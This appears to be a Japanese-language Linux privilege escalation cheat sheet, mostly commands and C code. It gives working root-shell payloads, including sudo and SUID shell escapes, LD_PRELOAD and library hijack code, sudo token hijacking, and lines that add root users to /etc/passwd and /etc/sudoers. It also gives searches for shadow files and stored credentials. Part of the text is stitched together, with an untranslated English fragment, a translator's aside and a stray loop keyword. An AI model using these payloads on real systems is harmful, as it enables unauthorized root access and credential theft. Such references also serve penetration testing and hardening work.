一部のLinuxバージョンは、**UID > INT\_MAX**を持つユーザーが特権を昇格させることができるバグの影響を受けました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。\
**`systemd-run -t /bin/bash`**を使用して**悪用**してください。

### グループ

ルート権限を付与する可能性のある**いくつかのグループのメンバー**であるかどうかを確認してください：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### クリップボード

クリップボード内に興味深い情報があるかどうかを確認してください（可能であれば）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワード**を知っている場合は、そのパスワードを使用して**各ユーザーとしてログインを試みてください**。

### Su Brute

たくさんのノイズを気にしない場合、かつコンピューターに`su`と`timeout`バイナリが存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使用してユーザーをブルートフォースできます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、`-a`パラメータを使用してユーザーをブルートフォースすることもできます。

## 書き込み可能なPATHの悪用

### $PATH

$PATHのいくつかのフォルダに**書き込み権限**があることがわかった場合、書き込み可能なフォルダ内に**バックドアを作成**して、そのバックドアの名前を、異なるユーザー（理想的にはroot）によって実行されるコマンドの名前にすることで、特権を昇格させることができるかもしれません。このコマンドは、$PATH内の書き込み可能なフォルダよりも前に位置するフォルダから読み込まれていない必要があります。

### SUDOとSUID

sudoを使用していくつかのコマンドを実行することが許可されているか、またはsuidビットが設定されているかもしれません。次のコマンドを使用して確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドを使用すると、ファイルの読み取りや書き込み、さらにはコマンドの実行が可能になることがあります。** たとえば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定は、ユーザーがパスワードを知らずに別のユーザーの特権でコマンドを実行できるようにする可能性があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
以下の例では、ユーザー`demo`が`root`として`vim`を実行できるため、`root`ディレクトリにsshキーを追加するか、`sh`を呼び出すことでシェルを取得するのは簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、**何かを実行する際に環境変数を設定**することをユーザーに許可します：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTBマシンAdmirerに基づいて**、スクリプトをrootとして実行する際に**任意のPythonライブラリを読み込むためにPYTHONPATHハイジャックに脆弱**でした：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo実行パスのバイパス

他のファイルを読むか、**シンボリックリンク**を使用します。例えば、sudoersファイル内: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もしワイルドカード（\*）が使用されている場合、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定せずにSudoコマンド/SUIDバイナリを使用する場合

もし**sudo権限**が**パスを指定せずに単一のコマンドに与えられている**場合: _hacker10 ALL= (root) less_、PATH変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合にも使用できます（常に** _**strings**_ **で奇妙なSUIDバイナリの内容を確認してください）。

[実行するペイロードの例。](payloads-to-execute.md)

### コマンドパスを持つSUIDバイナリ

**suid** バイナリが**パスを指定して別のコマンドを実行する**場合、その後、suidファイルが呼び出しているコマンドと同じ名前の関数を**エクスポート**しようとすることができます。

たとえば、suidバイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、その関数を作成してエクスポートしようとする必要があります:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD**環境変数は、標準Cライブラリ（`libc.so`）を含む他のすべてのライブラリよりも前に、1つ以上の共有ライブラリ（.soファイル）をローダーによってロードするよう指定するために使用されます。このプロセスは、ライブラリのプリロードとして知られています。

ただし、システムセキュリティを維持し、特に**suid/sgid**実行可能ファイルでこの機能が悪用されるのを防ぐために、システムは特定の条件を強制します：

- ローダーは、実ユーザーID（_ruid_）が有効ユーザーID（_euid_）と一致しない実行可能ファイルに対して**LD\_PRELOAD**を無視します。
- suid/sgidを持つ実行可能ファイルの場合、標準パスにあるかつsuid/sgidであるライブラリのみがプリロードされます。

特権昇格は、`sudo`でコマンドを実行できる権限がある場合、かつ`sudo -l`の出力に**env\_keep+=LD\_PRELOAD**ステートメントが含まれている場合に発生する可能性があります。この構成により、**LD\_PRELOAD**環境変数が永続化され、`sudo`でコマンドが実行されている場合でも認識されるようになり、特権を持つ任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
保存先を **/tmp/pe.c** としてください。
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
その後、**コンパイル**してください：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最終的に、**特権を昇格**して実行します。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
攻撃者が**LD\_LIBRARY\_PATH**環境変数を制御している場合、同様の権限昇格が悪用される可能性があります。攻撃者はライブラリが検索されるパスを制御しているため、この脆弱性を悪用できます。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID バイナリ – .so インジェクション

SUID 権限を持つバイナリが異常に見える場合、.so ファイルを適切に読み込んでいるかどうかを確認するのが良い習慣です。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"のようなエラーに遭遇すると、悪用の可能性が示唆されます。

これを悪用するためには、次のコードが含まれたCファイル、例えば"/path/to/.config/libcalc.c"を作成する必要があります:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルおよび実行されると、ファイルの権限を操作して特権を昇格し、特権を持つシェルを実行することを目的としています。

上記のCファイルを共有オブジェクト(.so)ファイルにコンパイルするには、次のコマンドを使用します:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最終的に、影響を受けるSUIDバイナリを実行すると、悪用がトリガーされ、システムが侵害される可能性があります。

## 共有オブジェクトのハイジャック
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
以下は、Linuxハードニング/特権昇格/README.mdファイルからのコンテンツです。関連する英語テキストを日本語に翻訳します。

```markdown
Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:
```

```markdown
見つけたSUIDバイナリがライブラリを読み込んでいるフォルダーに書き込み権限があるため、そのフォルダーに必要な名前のライブラリを作成しましょう：
```
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
エラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
それは、生成したライブラリに `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルセキュリティ制限をバイパスするために悪用できるUnixバイナリの厳選されたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに**引数のみをインジェクト**できる場合に使用されます。

このプロジェクトは、Unixバイナリの正当な機能を収集し、制限されたシェルから脱出したり、特権を昇格したり、昇格した権限を維持したり、ファイルを転送したり、バインドシェルやリバースシェルを生成したり、他のポストエクスプロイテーションタスクを容易にするために悪用できるものです。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、どのようにしてsudoルールを悪用できるかを確認できます。

### Sudoトークンの再利用

**sudoアクセス**があるがパスワードがない場合、**sudoコマンドの実行を待機してセッショントークンを乗っ取る**ことで特権を昇格できます。

特権昇格の要件：

* ユーザー "_sampleuser_" としてシェルにアクセスできる
* "_sampleuser_" が**`sudo`を使用して**最後の**15分間**に何かを実行している（デフォルトでは、パスワードを入力せずに`sudo`を使用できるsudoトークンの有効期間）
* `cat /proc/sys/kernel/yama/ptrace_scope` が0である
* `gdb` にアクセスできる（アップロードできる）

（一時的に`ptrace_scope`を有効にするには、`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用するか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` と設定します）

これらの要件がすべて満たされている場合、**次のリンクを使用して特権を昇格できます:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **最初のエクスプロイト** (`exploit.sh`) は、`/tmp/` に `activate_sudo_token` というバイナリを作成します。これを使用して、セッションでsudoトークンを**アクティブ化**できます（自動的にルートシェルは取得できません、`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **第二のエクスプロイト** (`exploit_v2.sh`) は、`/tmp` に所有者が root で setuid が設定された sh シェルを作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **第三のエクスプロイト** (`exploit_v3.sh`) は、**sudo トークンを永続化し、すべてのユーザーが sudo を使用できるようにする sudoers ファイルを作成**します
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<ユーザー名>

もしフォルダー内またはフォルダー内の作成されたファイルのいずれかに **書き込み権限** がある場合、バイナリ [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) を使用して **ユーザーとPID用のsudoトークンを作成** できます。\
例えば、_sampleuser_ のファイルを上書きでき、PID 1234 のそのユーザーとしてシェルを持っている場合、パスワードを知らなくても、次のように **sudo権限を取得** できます：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、`sudo` を使用できるユーザーと方法を設定します。これらのファイルは**デフォルトでユーザー root とグループ root だけが読むことができます**。\
**もし** このファイルを**読むことができる**場合、**興味深い情報を入手**できるかもしれません。そして、もしファイルを**書き込む**ことができる場合、**特権を昇格**することができます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
### If you can write you can abuse this permission

### 書き込みができる場合、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
別の権限を悪用する方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として `doas` などがあります。OpenBSD では、その設定を `/etc/doas.conf` で確認してください。
```
permit nopass demo as root cmd vim
```
### Sudoハイジャック

**ユーザーが通常マシンに接続し、`sudo`を使用して特権を昇格させる**ことを知っている場合、そのユーザーコンテキスト内でシェルを取得した場合、**新しいsudo実行可能ファイル**を作成して、あなたのコードをrootとして実行し、その後ユーザーのコマンドを実行することができます。その後、ユーザーコンテキストの$PATHを変更します（たとえば、.bash\_profileに新しいパスを追加する）ので、ユーザーがsudoを実行すると、あなたのsudo実行可能ファイルが実行されます。

ユーザーが別のシェル（bash以外）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)に別の例があります。

または、次のようなものを実行します：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

`/etc/ld.so.conf`ファイルは**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています：`include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf`からの設定ファイルが読み込まれます。この設定ファイルは**他のフォルダを指す**ことがあり、**ライブラリが検索される**フォルダを示します。例えば、`/etc/ld.so.conf.d/libc.conf`の内容は`/usr/local/lib`です。**これはシステムが`/usr/local/lib`内のライブラリを検索することを意味します**。

何らかの理由で、ユーザーが指定されたパスのいずれかに書き込み権限を持っている場合、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`内の任意のファイル、または`/etc/ld.so.conf.d/*.conf`内の設定ファイル内の任意のフォルダ、特権を昇格させる可能性があります。\
この設定ミスをどのように悪用するかを次のページで確認してください：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`にlibをコピーすることで、`RPATH`変数で指定された場所にあるプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
### Privilege Escalation

1. **Evil Library Creation:**
   
   Move to the `/var/tmp` directory and create an evil library using the following command:
   
   ```bash
   gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6
   ```
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 機能

Linuxの機能は、プロセスに利用可能なルート権限の**サブセット**を提供します。これにより、ルート権限が**小さな独立した単位**に分割されます。これらの単位のそれぞれをプロセスに独立して付与できます。これにより、特権の完全なセットが削減され、悪用のリスクが低下します。\
機能について詳しく知るには、次のページを読んでください：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## ディレクトリの権限

ディレクトリ内での**「実行」**ビットは、影響を受けるユーザーがフォルダに**「cd」**できることを意味します。\
**「読み取り」**ビットは、ユーザーが**ファイルをリスト**できることを意味し、**「書き込み」**ビットは、ユーザーが**ファイルを削除**したり**新しいファイルを作成**できることを意味します。

## ACL（アクセス制御リスト）

アクセス制御リスト（ACL）は、伝統的なugo/rwx権限を**オーバーライド**できる二次的な任意の権限を表します。これらの権限により、所有者やグループの一部でない特定のユーザーに権利を許可または拒否することで、ファイルやディレクトリへのアクセスをより細かく制御できます。このレベルの**細かいアクセス管理**が確保されます。詳細は[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)で確認できます。

ユーザー「kali」にファイルに対する読み取りと書き込み権限を**与える**：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定のACLを持つファイルを取得する方法:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## シェルセッションを開く

**古いバージョン**では、異なるユーザー（**root**）の一部の**シェル**セッションを**乗っ取る**ことができるかもしれません。\
**最新バージョン**では、**自分のユーザー**のスクリーンセッションにのみ**接続**できます。ただし、**セッション内に興味深い情報**が見つかるかもしれません。

### スクリーンセッションの乗っ取り

**スクリーンセッションのリスト**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmuxセッションの乗っ取り

これは**古いtmuxバージョン**の問題でした。私は特権を持たないユーザーとしてrootによって作成されたtmux（v2.1）セッションを乗っ取ることができませんでした。

**tmuxセッションのリスト**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debianベースのシステム（Ubuntu、Kubuntuなど）で2006年9月から2008年5月13日までに生成されたすべてのSSLおよびSSHキーは、このバグの影響を受ける可能性があります。\
このバグは、これらのOSで新しいsshキーを作成する際に発生します。**32,768のバリエーションしか可能ではなかった**ため、すべての可能性が計算でき、**sshの公開鍵を持っていれば対応する秘密鍵を検索できます**。計算された可能性はこちらで見つけることができます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSHの興味深い構成値

* **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
* **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
* **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列でアカウントにログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

rootがsshを使用してログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

* `yes`: rootはパスワードと秘密鍵を使用してログインできます
* `without-password`または`prohibit-password`: rootは秘密鍵のみを使用してログインできます
* `forced-commands-only`: Rootは、プライベートキーを使用してログインし、コマンドオプションが指定されている場合のみログインできます
* `no` : いいえ

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h`のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を示すことができます。例:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の**秘密**鍵でログインしようとすると、ssh があなたの鍵の公開鍵を `/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にある公開鍵と比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH エージェント転送を使用すると、サーバーに鍵（パスフレーズなし！）を置いたままにする代わりに、ローカルの SSH キーを使用できます。したがって、ssh 経由で **ホスト** に**ジャンプ**し、そこから**別の**ホストに**ジャンプ**して、**初期ホスト**にある**鍵**を使用できます。

これを `$HOME/.ssh.config` に次のように設定する必要があります：
```
Host example.com
ForwardAgent yes
```
注意してください。`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストは鍵にアクセスできるようになります（これはセキュリティ上の問題です）。

ファイル `/etc/ssh_config` はこの **オプションを上書き** して、この構成を許可または拒否できます。\
ファイル `/etc/sshd_config` は `AllowAgentForwarding` キーワードで ssh エージェントの転送を **許可** または **拒否** できます（デフォルトは許可）。

環境で Forward Agent が構成されていることがわかった場合は、以下のページを読んでください。**特権昇格に悪用できる可能性があります**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` および `/etc/profile.d/` 内のファイルは、**ユーザーが新しいシェルを実行したときに実行されるスクリプト** です。したがって、これらのいずれかを **書き込むか変更できる場合、特権を昇格** できます。
```bash
ls -l /etc/profile /etc/profile.d/
```
### パスワード/シャドウファイル

OSによっては、`/etc/passwd`および`/etc/shadow`ファイルが異なる名前を使用しているか、バックアップがあるかもしれません。したがって、**それらをすべて見つけ**、それらを読み取れるかどうかを**チェック**して、ファイル内に**ハッシュがあるかどうか**を確認することが推奨されています。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
いくつかの場合、`/etc/passwd`（または同等の）ファイル内に**パスワードハッシュ**を見つけることができます。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

最初に、次のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー`hacker`を追加し、生成されたパスワードを追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで`su`コマンドを`hacker:hacker`で使用できます。

代わりに、次の行を使用してパスワードのないダミーユーザーを追加できます。\
警告：現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**注意:** BSDプラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

あなたが**いくつかの機密ファイルに書き込めるかどうか**を確認する必要があります。たとえば、**サービス構成ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行しており、**/etc/systemd/**内の**Tomcatサービス構成ファイルを変更できる**場合、次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### バックドアは、次回Tomcatが起動されると実行されます。

### フォルダの確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（おそらく最後のものは読めないかもしれませんが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最後の数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite データベースファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読み、**パスワードを含む可能性のあるいくつかのファイル**を検索します。\
これを行うために使用できる**別の興味深いツール**は、[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。これは、Windows、Linux、Mac上に保存されている多くのパスワードを取得するために使用されるオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**それらの中に興味深い/機密情報を見つけることができる**かもしれません。ログがより奇妙であればあるほど、それはより興味深いでしょう（おそらく）。\
また、一部の「**悪意のある**」構成された（バックドアがある？）**監査ログ**は、この投稿で説明されているように、監査ログ内に**パスワードを記録**することを許可するかもしれません: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためには**、[**adm**](interesting-groups-linux-pe/#adm-group)グループを利用すると非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的な資格情報検索/正規表現

ファイル名やコンテンツ内に「**password**」という単語が含まれるファイルをチェックし、ログ内のIPやメールアドレス、ハッシュの正規表現もチェックすべきです。\
